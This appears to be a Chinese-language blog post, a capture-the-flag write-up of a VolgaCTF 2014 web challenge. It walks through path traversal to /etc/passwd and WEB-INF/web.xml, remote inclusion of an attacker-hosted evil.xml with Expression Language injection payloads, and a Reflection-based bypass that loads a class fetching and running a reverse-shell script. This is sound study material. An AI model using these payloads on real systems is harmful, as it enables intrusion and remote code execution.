@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="回到家看到 CRAX Team 在玩 VolgaCTF 就順手玩了一下! 解這題的時候順便讓我練習到了之前就想好好惡補一下的 EL 注入（Expression Language Injection） ，最後花了滿多時間再用 Java 的 Reflection API 來找到可利用的地方，網址點開為一個類似 Twitter 的個人留言板服務  註冊登入後長得如下，共有新增留言、設定、個人首頁、登出的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Volga CTF 2014 Web 400 write up">
+<meta property="og:url" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="回到家看到 CRAX Team 在玩 VolgaCTF 就順手玩了一下! 解這題的時候順便讓我練習到了之前就想好好惡補一下的 EL 注入（Expression Language Injection） ，最後花了滿多時間再用 Java 的 Reflection API 來找到可利用的地方，網址點開為一個類似 Twitter 的個人留言板服務  註冊登入後長得如下，共有新增留言、設定、個人首頁、登出的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/917cacd6c892c866-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/73cd3470ddfb60e0-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/6b0cc568c9a4a83b-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/672cc0742c7e56bd-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/9bc81385a8fc7ac4-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/3b21f915cb4c40eb-06.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/c991be5c081e46ed-07.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/8b059e226fd3fd3a-08.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/73f39b0d2d7cb158-09.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/2300cc88e646b421-10.png">
+<meta property="article:published_time" content="2014-03-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T20:57:53.038Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2014-03-volgactf-2014-web-400-write-up/917cacd6c892c866-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Volga CTF 2014 Web 400 write up | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Volga CTF 2014 Web 400 write up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2014-03-29T16:00:00.000Z" class="dt-published" itemprop="datePublished">2014-03-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>回到家看到 CRAX Team 在玩 VolgaCTF 就順手玩了一下!</p>
+<p>解這題的時候順便讓我練習到了之前就想好好惡補一下的 EL 注入（Expression Language Injection） ，最後花了滿多時間再用 Java 的 Reflection API 來找到可利用的地方，網址點開為一個類似 Twitter 的個人留言板服務</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/917cacd6c892c866-01.png"></p>
+<p>註冊登入後長得如下，共有新增留言、設定、個人首頁、登出的功能</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/73cd3470ddfb60e0-02.png"></p>
+<p>接下來就是開始找尋漏洞的時候，找的方法不外乎那些XD 最後是發現在設定的地方有個可以讓使用者自行指定布景 （header）的功能</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/6b0cc568c9a4a83b-03.png"></p>
+<p>使用 Tamper Data 對我們送出的資訊進行截取:</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/672cc0742c7e56bd-04.png"></p>
+<p>可以發現，送出的資料中 header 的部分是一個檔案路徑的形式存在</p>
+<blockquote>
+<p>.&#x2F;headers&#x2F;bar.xhtml</p>
+</blockquote>
+<p>網站透過這個功能去引用自己的 template 以達到使用者自定布景主題的效果，因此我們來試試看，將 header 設為 <code>../../../../../etc/passwd</code> 看會出現什麼事情？</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/9bc81385a8fc7ac4-05.png"></p>
+<p>網站死掉了…</p>
+<p>任何功能都無法操作，只能把 Cookie 清空再註冊一個帳號嘗試，之後的步驟都是這樣，只要一個地方出錯就要重新註冊一個帳號重來一次XD</p>
+<p>這點滿麻煩的，不過多少達到讓駭客覺得麻煩防駭客的效果XD</p>
+<p>不過從錯誤資訊可以看到，網站使用了 <code>&lt;ui:include src=&quot;...&quot;&gt;</code> 的方式引入檔案，所以透過這個功能我們可以引入伺服器上的任意檔案（但是只限定於 html, xml 格式，不然再處理時會出錯一樣無法看到檔案內容）</p>
+<p>雖然有格式限制，但我們可以嘗試引入網站 Java Servlet 的設定檔 <code>WEB-INF/web.xml</code> 來讀取一些設定</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/3b21f915cb4c40eb-06.png"></p>
+<p>現在已經定位了漏洞的地方了，接下來是如何的利用？</p>
+<p>發現，在引入的時候不只可以引入本地檔案，也可以利用 <a target="_blank" rel="noopener" href="http://yourhome/foo.xml">http://yourhome/foo.xml</a> 的方式引入外部 html 或者 xml，但是只是引入 html 或者 xml 有什麼用呢？</p>
+<p>在許多 Java Servlet 裏面（如 Struts, Spring Framework GlassFish etc…）我們可以使用一種叫做 EL 的語言，EL 本意是用來降低後端程式跟前端的困擾，讓兩者出來的程式可以更快速地結合</p>
+<p>使用的方式是使用 <code>$&#123;...EL...&#125;</code> 這樣的方式執行，所以我們將 header 設為自己伺服器上的檔案 <code>http://yourhome.com/evil.xml</code>，並將 evil.xml 內容設定為</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">f:view</span> <span class="attr">xmlns:f</span>=<span class="string">&quot;http://java.sun.com/jsf/core&quot;</span> <span class="attr">xmlns:h</span>=<span class="string">&quot;http://java.sun.com/jsf/html&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h:inputText</span> <span class="attr">id</span>=<span class="string">&quot;userName&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;$&#123;300*1+1&#125;&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">f:view</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/c991be5c081e46ed-07.png"></p>
+<p>可以看到 <code>300*1+1</code> 有確實的被執行到變成 <code>301</code> 惹，再用 applicationScope 查看一下伺服器設定:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">f:view</span> <span class="attr">xmlns:f</span>=<span class="string">&quot;http://java.sun.com/jsf/core&quot;</span> <span class="attr">xmlns:h</span>=<span class="string">&quot;http://java.sun.com/jsf/html&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h:inputText</span> <span class="attr">id</span>=<span class="string">&quot;userName&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;$&#123;applicationScope&#125;&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">f:view</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/8b059e226fd3fd3a-08.png"></p>
+<p>可以查看一些敏感資訊，最後是執行指令的部分。 EL 有對於一些危險指令做了一些限制，不過這些限制是可以繞過，相關 paper 可以參考 <a target="_blank" rel="noopener" href="https://www.aspectsecurity.com/uploads/downloads/2012/12/Remote-Code-with-Expression-Language-Injection.pdf">Remote Code with Expression Language Injection</a> </p>
+<p>內文中使用 <a target="_blank" rel="noopener" href="http://docs.oracle.com/javase/tutorial/reflect/">Java Reflection API</a> 的方式拿到 URLClassLoader 去讀取自己所寫好惡意的Java class 檔案，但是伺服器上的環境似乎跟 Paper 不太相同，所以不能直接使用上面的攻擊代碼，必須小改一下!</p>
+<p>伺服器上似乎沒有 pageContext 這個全域變數，所以無法透過它去取得 ServletContext 的 class，所以那時候就在慢慢踹，對其他已知的全域變數用 Relfection API  想辦法拿到ServletContext 這個 class</p>
+<p>最後發現可以改用 session.getServletContext()，因此改寫上面的攻擊代碼成:</p>
+<script src="//pastebin.com/embed_js.php?i=EWVnSde6"></script>
+
+
+
+
+
+<p><code>Malicious.class</code> 要放上你要執行的 Java 程式，我這裡放的是從自己的 server 上下載反連的 perl script，並且執行</p>
+<script src="//pastebin.com/embed_js.php?i=kyZBh8bQ"></script>
+
+
+
+
+
+<p>結果如下</p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/73f39b0d2d7cb158-09.png"></p>
+<p><img src="/posts/2014-03-volgactf-2014-web-400-write-up/2300cc88e646b421-10.png"></p>
+<blockquote>
+<p>FLAG W0W_S0_J@V@_SUCH_EL_V3RY_RCE</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
